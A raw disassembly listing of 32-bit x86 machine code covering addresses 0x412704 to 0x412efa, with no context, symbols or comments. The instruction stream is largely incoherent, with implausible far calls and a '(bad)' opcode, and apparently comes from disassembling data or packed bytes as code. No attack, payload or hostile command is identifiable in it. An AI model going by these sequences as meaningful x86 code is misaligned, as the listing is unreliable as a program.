  412704:	sbb    al,BYTE PTR [edi-0x7dfbfd20]
  41270a:	mov    WORD PTR [eax],es
  41270c:	sub    BYTE PTR [ecx],ah
  41270e:	add    DWORD PTR [esi+0x2],0xa6027000
  412715:	inc    esi
  412716:	test   BYTE PTR [ecx],al
  412718:	add    BYTE PTR [ebx+edx*4-0x60],0x48
  41271d:	sub    al,ah
  41271f:	add    BYTE PTR [eax],al
  412721:	or     BYTE PTR [edx],al
  412723:	or     eax,0x208404
  412728:	add    BYTE PTR [eax+0x61],al
  41272b:	or     DWORD PTR [eax+0x10],ecx
  41272e:	nop
  41272f:	and    edx,DWORD PTR [edx]
  412731:	add    al,0x64
  412733:	jno    0x4126b6
  412735:	xor    BYTE PTR [esi+0x212aa120],0x11
  41273c:	add    ah,BYTE PTR [ecx+0x94c6240]
  412742:	loopne 0x412748
  412744:	ret    
  412745:	add    BYTE PTR [esi],0x10
  412748:	mov    BYTE PTR [eax+eax*2],dh
  41274b:	adc    al,0x94
  41274d:	push   eax
  41274e:	and    BYTE PTR [eax],ah
  412750:	or     edx,DWORD PTR [eax+0x58824005]
  412756:	adc    BYTE PTR [eax+0x22],bl
  412759:	fs pusha 
  41275b:	push   es
  41275c:	adc    BYTE PTR [edx],cl
  41275e:	shl    BYTE PTR [eax],0xf
  412761:	push   esp
  412762:	add    al,BYTE PTR [eax]
  412764:	or     al,BYTE PTR [ebp+0xc0c0007]
  41276a:	add    BYTE PTR [edx-0x4bfeffda],dl
  412770:	add    al,0x1
  412772:	mov    bl,0x0
  412774:	inc    esp
  412775:	adc    BYTE PTR [eax+0x8],al
  412778:	rol    BYTE PTR [edx],0x14
  41277b:	dec    esp
  41277c:	call   DWORD PTR ds:0x421acc
  412782:	and    BYTE PTR [edx],0x1a
  412785:	sbb    eax,DWORD PTR [ecx+0xcd41028]
  41278b:	ret    0x8208
  41278e:	cli    
  41278f:	pusha  
  412790:	and    BYTE PTR [eax],bl
  412792:	add    BYTE PTR [eax],0x61
  412795:	sbb    BYTE PTR [esi+0x20],al
  412798:	nop
  412799:	add    al,0x0
  41279b:	or     DWORD PTR [eax+eax*1],ebx
  41279e:	push   es
  41279f:	add    DWORD PTR [eax],0xa4b00128
  4127a5:	or     BYTE PTR [eax+0xa],bl
  4127a8:	and    BYTE PTR [eax],cl
  4127aa:	add    BYTE PTR [eax],dl
  4127ac:	inc    ecx
  4127ad:	or     BYTE PTR [eax+0x2009050],al
  4127b3:	and    BYTE PTR [eax],al
  4127b5:	add    BYTE PTR [eax-0x7dbf57ff],al
  4127bb:	and    BYTE PTR [eax],0xa1
  4127be:	or     DWORD PTR [edx],ebp
  4127c0:	test   BYTE PTR [eax+0x1c400a40],al
  4127c6:	sub    cl,al
  4127c8:	adc    DWORD PTR [edx+0x30],edx
  4127cb:	nop
  4127cc:	adc    BYTE PTR [eax],ah
  4127ce:	add    BYTE PTR [ebx],dl
  4127d0:	and    BYTE PTR [eax+0x400011b2],cl
  4127d6:	dec    ecx
  4127d7:	and    DWORD PTR [eax],0x20aec004
  4127dd:	test   BYTE PTR [eax+0x0],al
  4127e0:	xchg   esp,eax
  4127e1:	rol    BYTE PTR [ecx-0x5e72e7f0],1
  4127e7:	mov    al,ds:0x80072010
  4127ec:	sbb    ah,BYTE PTR [eax]
  4127ee:	inc    eax
  4127ef:	dec    eax
  4127f0:	or     eax,0x2004924
  4127f5:	add    al,BYTE PTR [edx]
  4127f7:	and    BYTE PTR [eax],al
  4127f9:	adc    al,0x12
  4127fb:	add    ch,al
  4127fd:	adc    eax,0x20042
  412802:	add    DWORD PTR [eax],edx
  412804:	inc    ecx
  412805:	and    al,0x7
  412807:	or     BYTE PTR ds:0x3204801a,ah
  41280d:	add    ah,BYTE PTR [esi]
  41280f:	sub    eax,0x402b0604
  412814:	mov    ds:0x2ac004,al
  412819:	mov    DWORD PTR [eax],ebp
  41281b:	push   eax
  41281c:	xor    DWORD PTR [eax+0x40],esi
  41281f:	mov    al,0x12
  412821:	xor    cl,BYTE PTR [ecx+0x46c04044]
  412827:	rcr    DWORD PTR [esi+edx*4-0x3e],0x82
  41282c:	add    BYTE PTR [ecx],cl
  41282e:	add    al,BYTE PTR [eax]
  412830:	or     BYTE PTR [eax],0x1
  412833:	sub    BYTE PTR [esp+esi*1],bl
  412836:	push   es
  412837:	add    BYTE PTR [eiz*4+0x12060c04],dh
  41283e:	and    BYTE PTR [ecx],dl
  412840:	add    BYTE PTR [edx],0x2f
  412843:	push   ebp
  412844:	add    dl,al
  412846:	adc    al,0x4
  412848:	inc    eax
  412849:	sbb    ebx,DWORD PTR [edx]
  41284b:	rol    BYTE PTR [eax+0x80a02],0x82
  412852:	push   ecx
  412853:	add    eax,0x5a890104
  412858:	or     BYTE PTR [eax+ecx*1],0x20
  41285c:	and    BYTE PTR [ecx],al
  41285e:	add    al,0x10
  412860:	or     BYTE PTR [eax+0x5],bl
  412863:	add    BYTE PTR [eax],dh
  412865:	mov    edx,0xc6011148
  41286a:	adc    al,0x0
  41286c:	dec    ecx
  41286d:	and    BYTE PTR [edx+0x20],dl
  412870:	sub    BYTE PTR [eax+ecx*2],0x48
  412874:	push   es
  412875:	inc    ecx
  412876:	mov    BYTE PTR [ecx+0x42],al
  412879:	or     eax,0x3484101
  41287e:	add    BYTE PTR [eax],ah
  412880:	mov    BYTE PTR [eax+0x6],al
  412883:	or     BYTE PTR [eax],ah
  412885:	and    BYTE PTR [edx+eax*1],ah
  412888:	xchg   esi,eax
  412889:	add    BYTE PTR ds:0x6600313a,bl
  41288f:	add    ah,BYTE PTR [ebp-0x77]
  412892:	add    DWORD PTR [ecx],eax
  412894:	and    ecx,DWORD PTR [edx+0xed080]
  41289a:	pop    es
  41289b:	add    BYTE PTR [ecx-0x53],al
  41289e:	sub    BYTE PTR [ebx],0x0
  4128a1:	adc    DWORD PTR [esi-0x3b1ebffc],esp
  4128a7:	or     DWORD PTR [eax],eax
  4128a9:	inc    edi
  4128aa:	add    BYTE PTR [edi],dl
  4128ac:	add    al,0x1
  4128ae:	and    BYTE PTR [edx+0x1021068],al
  4128b4:	and    DWORD PTR [eax+0x4],edx
  4128b7:	and    DWORD PTR [eax],ecx
  4128b9:	add    al,0x20
  4128bb:	inc    ecx
  4128bc:	add    DWORD PTR [eax],esp
  4128be:	rcr    BYTE PTR [eax+ecx*1+0x52],0xc
  4128c3:	and    eax,0xc0b8102a
  4128c8:	add    BYTE PTR [eax+0x21],ah
  4128cb:	cmp    DWORD PTR [edx+edx*2-0x4f],eax
  4128cf:	ret    0x640
  4128d2:	and    al,0x0
  4128d4:	lock mov cl,0x49
  4128d7:	inc    eax
  4128d8:	or     DWORD PTR [edx-0x67ff3b47],eax
  4128de:	or     BYTE PTR [edx],bl
  4128e0:	sub    BYTE PTR [eax+0x22],al
  4128e3:	retf   0x8000
  4128e6:	popa   
  4128e7:	xor    BYTE PTR fs:[edx],al
  4128ea:	adc    cl,0x8
  4128ed:	or     BYTE PTR [edx+0x30dc8000],0x80
  4128f4:	add    al,BYTE PTR [ecx+0x34]
  4128f7:	push   es
  4128f8:	and    BYTE PTR ds:0x2228,0x45
  4128ff:	and    cl,bl
  412901:	inc    eax
  412902:	inc    eax
  412903:	add    BYTE PTR [ecx],ah
  412905:	and    BYTE PTR [eax+eiz*4+0x6080a08b],0x4
  41290d:	and    BYTE PTR [eax],ch
  41290f:	or     DWORD PTR [ebx+eax*1],eax
  412912:	inc    edx
  412913:	sub    BYTE PTR [eax+0x9],ch
  412916:	sbb    BYTE PTR [edx+0x1a],0x81
  41291a:	add    BYTE PTR [edx],ch
  41291c:	sub    eax,0x615688
  412921:	add    BYTE PTR fs:[edx],bl
  412924:	sub    eax,DWORD PTR [eax]
  412926:	add    BYTE PTR [eax+0x8],al
  412929:	adc    eax,DWORD PTR [ecx+0x6284c420]
  41292f:	xor    BYTE PTR [eax-0x44],0x23
  412933:	js     0x4128b5
  412935:	add    eax,0x8211600
  41293a:	sub    DWORD PTR [eax],edx
  41293c:	inc    eax
  41293d:	mov    al,0x90
  41293f:	and    al,0x10
  412941:	bound  ecx,QWORD PTR [edx]
  412943:	cs inc edx
  412945:	or     BYTE PTR [ecx+eax*1],al
  412948:	add    BYTE PTR [edx-0x2bb594d6],al
  41294e:	mov    al,ds:0x5040
  412953:	test   BYTE PTR [eax],dl
  412955:	adc    BYTE PTR [eax+0x2201430c],al
  41295b:	or     esp,DWORD PTR [esi]
  41295d:	xor    DWORD PTR [eax],0x1
  412960:	add    esp,DWORD PTR [ebp-0x58]
  412963:	popa   
  412964:	or     al,0x40
  412966:	and    BYTE PTR [edx],cl
  412968:	adc    ah,BYTE PTR [eax]
  41296a:	hlt    
  41296b:	adc    BYTE PTR [ecx],ch
  41296d:	or     BYTE PTR [ebx-0x7ff0be30],al
  412973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412974:	mov    al,0x46
  412976:	mov    WORD PTR [edx],fs
  412978:	push   esp
  412979:	adc    BYTE PTR [edx],al
  41297b:	mov    ds:0x19133a20,al
  412980:	adc    DWORD PTR [ecx],0x593058a
  412986:	cwde   
  412987:	mov    al,ds:0x440a8481
  41298c:	pop    es
  41298d:	inc    eax
  41298e:	lods   al,BYTE PTR ds:[esi]
  41298f:	sub    BYTE PTR es:[ecx+edx*1+0x200103ca],al
  412997:	and    DWORD PTR [ecx],0x3
  41299a:	push   edx
  41299b:	adc    BYTE PTR [edx],al
  41299d:	adc    eax,0xc404031
  4129a2:	adc    BYTE PTR [edx+eiz*1],al
  4129a5:	add    BYTE PTR [eax+0x16],al
  4129a8:	adc    BYTE PTR [eax+0x10501020],al
  4129ae:	xor    BYTE PTR [eax],ah
  4129b0:	pop    eax
  4129b1:	inc    ebx
  4129b2:	add    cl,BYTE PTR [eax+0x4802330]
  4129b8:	add    BYTE PTR [eax],al
  4129ba:	xchg   BYTE PTR [ebx+0x8002a02],al
  4129c0:	add    al,BYTE PTR [eax]
  4129c2:	or     cl,BYTE PTR [eax+eax*1]
  4129c5:	nop    DWORD PTR [edx+ecx*1]
  4129c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129ca:	nop
  4129cb:	add    BYTE PTR [eax],ch
  4129cd:	ret    0x18c0
  4129d0:	adc    DWORD PTR ds:0x41c080,esi
  4129d6:	add    al,0x4
  4129d8:	add    DWORD PTR [ebx],0x50000200
  4129de:	or     DWORD PTR [ebx],edx
  4129e0:	and    BYTE PTR ds:0x5004aa01,al
  4129e6:	or     eax,0x40700010
  4129eb:	call   0x8446428a
  4129f0:	inc    eax
  4129f1:	add    eax,0x2088826
  4129f6:	pop    edx
  4129f7:	xor    BYTE PTR [edx+0xa94d041],al
  4129fd:	add    dl,BYTE PTR [ecx]
  4129ff:	add    BYTE PTR [eax],ah
  412a01:	sbb    DWORD PTR [eax+0x14000810],edx
  412a07:	add    BYTE PTR [edx],dl
  412a09:	and    cl,BYTE PTR [edx+0x0]
  412a0c:	add    eax,0x16810016
  412a11:	push   ds
  412a12:	push   es
  412a13:	adc    al,0x80
  412a15:	add    al,BYTE PTR [esi+eax*2]
  412a18:	push   eax
  412a19:	or     BYTE PTR [eax],dh
  412a1b:	or     DWORD PTR [edx+0x305011c],eax
  412a21:	add    dl,dl
  412a23:	ret    0x2430
  412a26:	adc    DWORD PTR [edx+eax*1-0x3e],esp
  412a2a:	add    BYTE PTR [edx],al
  412a2c:	add    BYTE PTR [ecx-0x65f71fef],al
  412a32:	pusha  
  412a33:	sbb    al,0x89
  412a35:	add    DWORD PTR [eax],ebx
  412a37:	or     BYTE PTR [edx+0x6],al
  412a3a:	inc    esp
  412a3b:	and    DWORD PTR [edx],edx
  412a3d:	call   0x45ec144
  412a42:	and    BYTE PTR [edi],ch
  412a44:	inc    eax
  412a45:	or     al,0xc4
  412a47:	add    BYTE PTR [eax+0x820a018],al
  412a4d:	push   es
  412a4e:	call   0x46baa61
  412a53:	sub    eax,DWORD PTR [eax+0x4]
  412a56:	or     ecx,DWORD PTR [eax]
  412a58:	sub    BYTE PTR [eax],dl
  412a5a:	ins    BYTE PTR es:[edi],dx
  412a5b:	or     al,BYTE PTR [ecx+edx*4-0x5bb66fff]
  412a62:	add    al,0x42
  412a64:	inc    esp
  412a65:	adc    BYTE PTR [ecx],cl
  412a67:	add    al,0x47
  412a69:	and    al,0x80
  412a6b:	push   es
  412a6c:	inc    eax
  412a6d:	push   ss
  412a6e:	add    DWORD PTR [eax],eax
  412a70:	shr    DWORD PTR [esp+eax*4-0x1cfaf77c],0x40
  412a78:	ret    0xca13
  412a7b:	dec    ebx
  412a7c:	add    al,0xa6
  412a7e:	add    DWORD PTR [eax],eax
  412a80:	mov    al,ds:0x800
  412a85:	and    al,0xfc
  412a87:	or     BYTE PTR [eax],dl
  412a89:	add    DWORD PTR [eax],edx
  412a8b:	add    BYTE PTR [ebx],dl
  412a8d:	add    BYTE PTR [edx],ah
  412a8f:	adc    eax,0x2180
  412a94:	add    dh,BYTE PTR [eax]
  412a96:	xor    DWORD PTR [ecx-0x7d],eax
  412a99:	or     al,0x50
  412a9b:	mov    BYTE PTR [edx+0x3051d42],ch
  412aa1:	or     cl,BYTE PTR [edi-0x6e]
  412aa4:	mov    al,ds:0xc40410c
  412aa9:	repnz adc ebx,DWORD PTR [edx]
  412aac:	add    al,0x8a
  412aae:	or     BYTE PTR [esi+0x72],al
  412ab1:	sub    BYTE PTR [ecx],dh
  412ab3:	mov    BYTE PTR [ecx+eax*2-0x6fdffc70],cl
  412aba:	add    al,0x5
  412abc:	or     cl,BYTE PTR [edx+0x40146040]
  412ac2:	inc    ecx
  412ac3:	add    eax,0x218104
  412ac8:	rcl    DWORD PTR [edx-0x7fdef700],0x8
  412acf:	shl    DWORD PTR [eax+eax*1+0x208050c2],0x19
  412ad7:	test   BYTE PTR [eax],al
  412ad9:	sub    BYTE PTR [ebp+0x567bc108],dl
  412adf:	add    al,BYTE PTR [eax-0x7f]
  412ae2:	and    BYTE PTR [eax+0x22809b0a],al
  412ae8:	sbb    al,0x80
  412aea:	add    BYTE PTR [edx+0x42432205],al
  412af0:	sub    al,0x10
  412af2:	lea    esi,[ecx+0x0]
  412af5:	add    DWORD PTR [eax],0x49209408
  412afb:	inc    eax
  412afc:	add    BYTE PTR [eax+edx*1],al
  412aff:	and    cl,al
  412b01:	add    al,BYTE PTR [edx+0x43]
  412b04:	mov    ah,0x59
  412b06:	leave  
  412b07:	add    DWORD PTR [ecx+eax*1+0x20048797],0x1410180
  412b12:	adc    dl,BYTE PTR [eax]
  412b14:	adc    al,BYTE PTR [eax]
  412b16:	sbb    BYTE PTR [ecx+0x26],al
  412b19:	sbb    al,0x80
  412b1b:	push   es
  412b1c:	sbb    BYTE PTR [eax],al
  412b1e:	mov    eax,ds:0x8020e08
  412b23:	xchg   esp,eax
  412b24:	pop    ecx
  412b25:	and    eax,DWORD PTR [eax]
  412b27:	sub    ah,BYTE PTR [esi]
  412b29:	shl    BYTE PTR [edx],1
  412b2b:	add    al,0x2
  412b2d:	add    BYTE PTR [eax+0x42],dl
  412b30:	fs inc ecx
  412b32:	sbb    BYTE PTR [eax],cl
  412b34:	add    al,BYTE PTR [edx+edx*1+0x12810b0]
  412b3b:	add    BYTE PTR [eax-0x6f7fc7ef],ah
  412b41:	mov    DWORD PTR [esi],esi
  412b43:	add    BYTE PTR [ecx],0x21
  412b46:	or     DWORD PTR [esp+eax*2],eax
  412b49:	xchg   esp,eax
  412b4a:	mov    eax,0x9000000
  412b4f:	add    BYTE PTR [edx],0x12
  412b52:	and    BYTE PTR [ecx],al
  412b54:	inc    eax
  412b55:	or     dl,BYTE PTR [eax]
  412b57:	sbb    BYTE PTR [eax],cl
  412b59:	inc    eax
  412b5a:	lahf   
  412b5b:	or     BYTE PTR [ecx+eax*4],al
  412b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b5f:	sbb    ah,BYTE PTR [eax+0x44]
  412b62:	or     BYTE PTR [eax+0x16],0x1
  412b66:	inc    ebx
  412b67:	or     al,0x20
  412b69:	test   al,0x89
  412b6b:	adc    al,0x51
  412b6d:	add    DWORD PTR [eax],eax
  412b6f:	adc    BYTE PTR ds:0xa0b242d1,al
  412b75:	sub    dl,BYTE PTR [ecx+0x5a]
  412b78:	nop
  412b79:	xor    esp,DWORD PTR [esi]
  412b7b:	pusha  
  412b7c:	add    al,BYTE PTR [esp+ebp*8]
  412b7f:	add    BYTE PTR [eax+0x41714002],ch
  412b85:	add    al,0x40
  412b87:	mov    al,ds:0x90b08111
  412b8c:	popa   
  412b8d:	sbb    DWORD PTR [eax+0x32],0x0
  412b91:	call   0x4a91:0x2c82502
  412b98:	adc    al,al
  412b9a:	push   0x3a9408
  412b9f:	add    dl,BYTE PTR [eax]
  412ba1:	push   edx
  412ba2:	add    al,0x17
  412ba4:	or     al,BYTE PTR [eax+0x792040]
  412baa:	push   eax
  412bab:	add    al,BYTE PTR [eax+ecx*2+0x15000098]
  412bb2:	add    DWORD PTR [edx],ecx
  412bb4:	add    BYTE PTR [eax],cl
  412bb6:	popa   
  412bb7:	lock add BYTE PTR [esp+edx*4],bh
  412bbb:	inc    esi
  412bbc:	push   0x20028323
  412bc1:	inc    eax
  412bc2:	mov    ds:0x24090800,eax
  412bc7:	add    BYTE PTR [esi],bh
  412bc9:	xchg   esi,eax
  412bca:	xchg   esp,eax
  412bcb:	push   eax
  412bcc:	inc    edx
  412bcd:	or     BYTE PTR [eax+0x1800840c],ah
  412bd3:	adc    BYTE PTR [eax+0x30],0x0
  412bd7:	es inc esp
  412bd9:	adc    bl,al
  412bdb:	add    BYTE PTR [eax],ah
  412bdd:	leave  
  412bde:	add    cl,al
  412be0:	add    BYTE PTR [ecx],dl
  412be2:	xor    BYTE PTR [esp+edx*2+0x2a18a000],al
  412be9:	add    BYTE PTR [eax],cl
  412beb:	xor    al,0xc6
  412bed:	mov    eax,DWORD PTR [edi]
  412bef:	and    BYTE PTR [eax+eax*1],0xe4
  412bf3:	xor    DWORD PTR [eax+ecx*2-0x525cffe8],eax
  412bfa:	adc    al,0x18
  412bfc:	add    al,0x80
  412bfe:	add    BYTE PTR [eax],cl
  412c00:	jo     0x412c1a
  412c02:	sbb    BYTE PTR [edx+0x40],0xcc
  412c06:	and    DWORD PTR [eax],eax
  412c08:	cwde   
  412c09:	sbb    BYTE PTR [eax+0x22051048],0x10
  412c10:	cwde   
  412c11:	add    al,BYTE PTR [edx]
  412c13:	add    al,BYTE PTR [eax]
  412c15:	popa   
  412c16:	and    dl,al
  412c18:	adc    BYTE PTR [esi],dl
  412c1a:	add    DWORD PTR [edi],edx
  412c1c:	nop
  412c1d:	add    BYTE PTR [ecx+0x82000a0],ah
  412c23:	adc    BYTE PTR [edx],al
  412c25:	xor    BYTE PTR [eax],cl
  412c27:	jo     0x412c29
  412c29:	add    eax,ebx
  412c2b:	add    ah,BYTE PTR [edi+0x401a8cd]
  412c31:	push   0x3004688a
  412c36:	add    al,BYTE PTR [esi+0x8]
  412c39:	nop
  412c3a:	xor    DWORD PTR [eax],eax
  412c3c:	adc    DWORD PTR [esp+eax*1],eax
  412c3f:	dec    eax
  412c40:	xor    DWORD PTR [ebp+0x5201e40],eax
  412c46:	add    ah,cl
  412c48:	cwde   
  412c49:	push   0x49406804
  412c4e:	add    BYTE PTR [edx+0x6],0x84
  412c52:	inc    eax
  412c53:	adc    BYTE PTR [ebx],al
  412c55:	and    DWORD PTR [esi+0x30080250],esp
  412c5b:	pusha  
  412c5c:	add    al,BYTE PTR [ecx-0x77]
  412c5f:	sbb    bl,BYTE PTR [edx]
  412c61:	or     DWORD PTR [ecx],esp
  412c63:	sbb    BYTE PTR [eax+0x9509000],0x22
  412c6a:	or     BYTE PTR [eax],ah
  412c6c:	adc    BYTE PTR [eax+0x55],dh
  412c6f:	add    BYTE PTR [eax+0x0],al
  412c72:	add    eax,0xc8082c00
  412c77:	add    DWORD PTR [edx],ebp
  412c79:	and    al,0x89
  412c7b:	ret    0x7900
  412c7e:	test   BYTE PTR [edx+0xa013006],dl
  412c84:	add    BYTE PTR [eax],al
  412c86:	adc    BYTE PTR [eax],ah
  412c88:	or     BYTE PTR [eax+0x1],al
  412c8b:	adc    BYTE PTR [ecx],ah
  412c8d:	inc    esp
  412c8e:	or     BYTE PTR [eax+0x200a9310],al
  412c94:	mov    ds:0x8200424,al
  412c99:	push   ss
  412c9a:	xor    BYTE PTR [eax*2-0x7d9efb82],al
  412ca1:	dec    eax
  412ca2:	or     BYTE PTR [edx],dl
  412ca4:	add    al,BYTE PTR [edx+0x8]
  412ca7:	add    BYTE PTR [eax],al
  412ca9:	add    BYTE PTR [eax+0x19],bl
  412cac:	xchg   esp,eax
  412cad:	pop    esp
  412cae:	pusha  
  412caf:	nop
  412cb0:	retf   0x410
  412cb3:	add    al,0x89
  412cb5:	or     DWORD PTR [ecx],eax
  412cb7:	and    BYTE PTR [eax],al
  412cb9:	add    al,0x5
  412cbb:	push   eax
  412cbc:	add    ah,BYTE PTR [eax]
  412cbe:	mov    BYTE PTR [eax],bl
  412cc0:	pop    ecx
  412cc1:	xchg   cl,al
  412cc3:	adc    BYTE PTR [eax+0x0],cl
  412cc6:	cmp    al,BYTE PTR [eax]
  412cc8:	or     al,BYTE PTR [eax+0xc]
  412ccb:	test   BYTE PTR [ecx],cl
  412ccd:	adc    ah,BYTE PTR [ebp+ecx*4+0x2012544a]
  412cd4:	or     DWORD PTR [eax+ecx*1+0x2000730],esp
  412cdb:	sbb    BYTE PTR [eax],dl
  412cdd:	xor    al,0x80
  412cdf:	or     BYTE PTR [eax],0x0
  412ce2:	(bad)  
  412ce3:	rcl    ch,0x42
  412ce6:	or     BYTE PTR [ebx+0x41],bl
  412ce9:	nop
  412cea:	adc    DWORD PTR [ecx+0xd530a1],ecx
  412cf0:	add    ch,al
  412cf2:	add    DWORD PTR [eax],eax
  412cf4:	or     BYTE PTR [ecx],cl
  412cf6:	push   esp
  412cf7:	and    al,0x4d
  412cf9:	sub    al,0x28
  412cfb:	add    BYTE PTR [eax],ah
  412cfd:	inc    ecx
  412cfe:	pushf  
  412cff:	or     BYTE PTR [eax+0x8],al
  412d02:	add    al,0x8
  412d04:	sub    BYTE PTR [edx+0x10],dl
  412d07:	adc    BYTE PTR [eax-0x67fbfec0],0x88
  412d0e:	add    BYTE PTR [eax],0x0
  412d11:	add    DWORD PTR [ebx],0x44060194
  412d17:	add    DWORD PTR [eax],eax
  412d19:	add    al,0x30
  412d1b:	or     cl,BYTE PTR [ebx]
  412d1d:	pop    eax
  412d1e:	pusha  
  412d1f:	dec    esi
  412d20:	adc    dl,BYTE PTR [edx+0x18]
  412d23:	or     BYTE PTR [eax+0x50],dl
  412d26:	push   esi
  412d27:	add    edx,DWORD PTR [eax+0x43]
  412d2a:	add    al,0x20
  412d2c:	add    eax,DWORD PTR [eax+eax*2]
  412d2f:	pusha  
  412d30:	pop    es
  412d31:	ret    0x8041
  412d34:	rcl    BYTE PTR [eax],1
  412d36:	adc    DWORD PTR [esi],eax
  412d38:	add    dl,BYTE PTR [eax]
  412d3a:	loope  0x412d5e
  412d3c:	and    DWORD PTR [ecx],edx
  412d3e:	add    BYTE PTR [eax],al
  412d40:	dec    esp
  412d41:	and    al,0x3a
  412d43:	add    BYTE PTR [ecx+0x0],dl
  412d46:	inc    eax
  412d47:	pop    eax
  412d48:	call   0x6a3d:0xc5005892
  412d4f:	or     al,BYTE PTR [eax]
  412d51:	and    BYTE PTR [ebx],al
  412d53:	stos   DWORD PTR es:[edi],eax
  412d54:	adc    al,0x8
  412d56:	add    al,ah
  412d58:	mov    WORD PTR [eax],cs
  412d5a:	and    BYTE PTR [eax+0x5018a1a],al
  412d60:	mov    BYTE PTR [eax+0x1001048],ch
  412d66:	sub    BYTE PTR [ecx+edx*4],dl
  412d69:	dec    eax
  412d6a:	adc    eax,edx
  412d6c:	push   cs
  412d6d:	sbb    al,al
  412d6f:	and    al,al
  412d71:	add    BYTE PTR [eax],ah
  412d73:	loope  0x412d9e
  412d75:	or     BYTE PTR [edx+edi*1-0x5c],al
  412d79:	sub    BYTE PTR [eax+0x24],al
  412d7c:	or     DWORD PTR [edx],ecx
  412d7e:	or     cl,BYTE PTR [ecx]
  412d80:	and    BYTE PTR [ebp+0x202440a8],ah
  412d86:	les    eax,FWORD PTR [eax]
  412d88:	adc    BYTE PTR [eax+ecx*1],ah
  412d8b:	and    BYTE PTR [eax],al
  412d8d:	test   eax,0x4030e004
  412d92:	add    BYTE PTR [edx-0x27fd7efc],al
  412d98:	sub    dl,BYTE PTR [ecx+eax*1+0x28c40220]
  412d9f:	add    eax,0x81046281
  412da4:	int3   
  412da5:	xchg   ebp,eax
  412da6:	and    al,0x4f
  412da8:	and    al,0xa
  412daa:	add    eax,0x97096e4c
  412daf:	add    al,0x14
  412db1:	add    BYTE PTR [edx+0x38],cl
  412db4:	and    BYTE PTR [eax+0x8],ah
  412db7:	or     al,0x30
  412db9:	or     BYTE PTR [eax+eax*4],al
  412dbc:	or     al,BYTE PTR [eax]
  412dbe:	push   eax
  412dbf:	test   eax,0x59b709a
  412dc4:	and    BYTE PTR [eax+0x21],bl
  412dc7:	fs add al,0x20
  412dca:	pop    eax
  412dcb:	jno    0x412df1
  412dcd:	add    al,0x82
  412dcf:	rol    BYTE PTR [eax],0x1
  412dd2:	and    BYTE PTR [eax],al
  412dd4:	inc    edx
  412dd5:	pop    ecx
  412dd6:	inc    esp
  412dd7:	and    BYTE PTR [eax],al
  412dd9:	add    eax,DWORD PTR [eax+0x18]
  412ddc:	adc    BYTE PTR [eax+ebp*8],al
  412ddf:	or     al,0x3a
  412de1:	aaa    
  412de2:	popa   
  412de3:	push   ds
  412de4:	add    al,0x11
  412de6:	add    DWORD PTR [ecx+eax*2+0x10],esi
  412dea:	adc    BYTE PTR [ebp-0x73],al
  412ded:	mov    BYTE PTR [eax+eax*1],al
  412df0:	sbb    DWORD PTR [eax],eax
  412df2:	or     al,0xa5
  412df4:	or     BYTE PTR [eax+0x48],al
  412df7:	mov    al,ds:0x5a00808
  412dfc:	mov    al,ds:0x302c5688
  412e01:	add    al,0x7c
  412e03:	dec    ecx
  412e04:	add    DWORD PTR [esi],0x3811862a
  412e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e0c:	or     ah,BYTE PTR [eax+0xd]
  412e0f:	ret    
  412e10:	mov    al,ds:0x80014102
  412e15:	shl    BYTE PTR [ecx+edx*2+0x1c0008e0],0x1
  412e1d:	and    BYTE PTR [ecx],0x10
  412e20:	pop    eax
  412e21:	adc    BYTE PTR [eax+0x43c2],al
  412e27:	or     BYTE PTR [eax],ah
  412e29:	adc    DWORD PTR [edx*1+0x202],eax
  412e30:	push   0x4080cc42
  412e35:	add    BYTE PTR [eax],cl
  412e37:	add    al,0x91
  412e39:	or     BYTE PTR [edx+0x7],al
  412e3c:	adc    BYTE PTR [ecx],al
  412e3e:	add    al,0x2
  412e40:	fs inc ecx
  412e42:	adc    DWORD PTR [edi],eax
  412e44:	push   0x10008c12
  412e49:	xor    BYTE PTR [edx],bl
  412e4b:	mov    WORD PTR [ebx],cs
  412e4d:	nop
  412e4e:	mov    al,0x26
  412e50:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e52:	jo     0x412e8c
  412e54:	dec    ecx
  412e55:	dec    eax
  412e56:	mov    al,ds:0x30511811
  412e5b:	add    BYTE PTR [eax+0x4903a9c0],cl
  412e61:	bound  edx,QWORD PTR [eax]
  412e63:	or     al,0x88
  412e65:	push   eax
  412e66:	retf   
  412e67:	add    dl,BYTE PTR [eax+0x10]
  412e6a:	add    BYTE PTR [eax],al
  412e6c:	mov    dl,dl
  412e6e:	adc    BYTE PTR [eax+0xe040a00],al
  412e74:	or     DWORD PTR [ebp+0x0],eax
  412e77:	adc    BYTE PTR [ebx+0x62003802],al
  412e7d:	add    BYTE PTR [eax],al
  412e7f:	inc    eax
  412e80:	and    BYTE PTR [eax+0x8541300],al
  412e86:	sub    BYTE PTR [eax+edx*1],dl
  412e89:	add    DWORD PTR [eax-0x2dfbcefe],0x87080105
  412e93:	add    BYTE PTR [eax+eiz*2],dh
  412e96:	sbb    al,BYTE PTR [eax]
  412e98:	add    ch,BYTE PTR [edx+eax*1+0x10844110]
  412e9f:	or     DWORD PTR [esi],ecx
  412ea1:	inc    esp
  412ea2:	add    BYTE PTR [eax+0x152189d0],0xa2
  412ea9:	add    BYTE PTR [edx],dl
  412eab:	stos   BYTE PTR es:[edi],al
  412eac:	mov    cl,dl
  412eae:	add    DWORD PTR [eax],ecx
  412eb0:	inc    ebp
  412eb1:	and    BYTE PTR [ecx],0x8
  412eb4:	add    al,BYTE PTR [eax]
  412eb6:	or     BYTE PTR [eax+0x30454131],al
  412ebc:	dec    eax
  412ebd:	xchg   esi,eax
  412ebe:	or     BYTE PTR [ecx+0x16005028],dl
  412ec4:	sub    BYTE PTR ds:0x40154003,0x83
  412ecb:	sub    DWORD PTR [edx],0x4e
  412ece:	add    eax,0x81415c08
  412ed3:	test   BYTE PTR [eax],cl
  412ed5:	add    BYTE PTR [edx+0x4180180],al
  412edb:	add    DWORD PTR cs:[eax+0x1c],esi
  412edf:	loopne 0x412ee9
  412ee1:	shl    BYTE PTR [edi+0x4a830205],1
  412ee7:	or     BYTE PTR [eax],dh
  412ee9:	and    BYTE PTR [edx+0x1015a4],cl
  412eef:	js     0x412f51
  412ef1:	add    al,BYTE PTR [eax+0x1c11200]
  412ef7:	and    DWORD PTR [eax],ebx
  412ef9:	pop    ecx
  412efa:	add    eax,0x838206c
